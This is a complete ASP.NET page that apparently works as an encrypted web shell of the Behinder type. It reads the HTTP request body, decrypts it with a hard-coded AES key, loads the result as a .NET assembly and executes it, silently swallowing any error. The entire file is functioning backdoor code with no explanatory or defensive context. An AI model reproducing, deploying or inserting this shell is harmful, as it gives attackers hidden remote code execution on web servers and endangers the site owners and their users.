<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.IO"%>
<%
    try {
        string key = "900bc885d7553375";
        byte[] k = Encoding.Default.GetBytes(key);
        Session.Add("sky", key);
        StreamReader sr = new StreamReader(Request.InputStream);
        string line = sr.ReadLine();
        if (!string.IsNullOrEmpty(line))
        {
            byte[] c = Convert.FromBase64String(line);
            Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this.Context);
            sr.Close();
        }
    }
    catch{ }

%>